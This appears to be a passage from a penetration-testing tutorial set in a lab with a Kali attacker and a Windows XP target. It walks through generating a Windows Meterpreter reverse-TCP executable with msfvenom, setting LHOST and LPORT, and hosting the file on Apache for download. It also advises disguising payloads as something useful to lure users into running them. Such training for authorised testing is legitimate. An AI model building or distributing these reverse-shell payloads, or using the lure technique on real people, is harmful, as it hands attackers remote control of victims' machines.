root@kali:~#msfvenom -h
 To list all the available payloads, enter
 root@kali:~#msfvenom -l payloads
 
 root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp -o

our LHOST needs to be set, and our LPORT is set to the default
4444. For practice, set LPORT to 12345 by entering LPORT=12345. We also see EXITFUNC, which we can leave as the default. Because this is a reverse connection payload, we need to set our LHOST option to tell the target machine where to connect back to (our Kali machine). 

Now tell Msfvenom which output format to use. To see all available output formats, enter 
root@kali:~# msfvenom --help-formats.

root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.9 LPORT=12345 -f exe > chapter4example.exe

verify:
root@kali:~# file chapter4example.exe

One good way to serve up payloads is to host them on a web server, disguise them as something useful, and lure users into downloading them. For this example, we’ll host our Metasploit executable on our Kali machine’s builtin Apache server and browse to the file from our target machine. 

First, run cp chapter4example.exe /var/www to copy the payload executable to the Apache directory, and then make sure the web server is started with service apache2 start.

root@kali:~# cp chapter4example.exe /var/www/html
root@kali:~# sudo chown -R $USER:$USER /var/www/html
root@kali:~# service apache2 start


Now switch to your Windows XP target and open Internet Explorer.
Browse to http://172.30.17.56/chapter4example.exe and download the file.
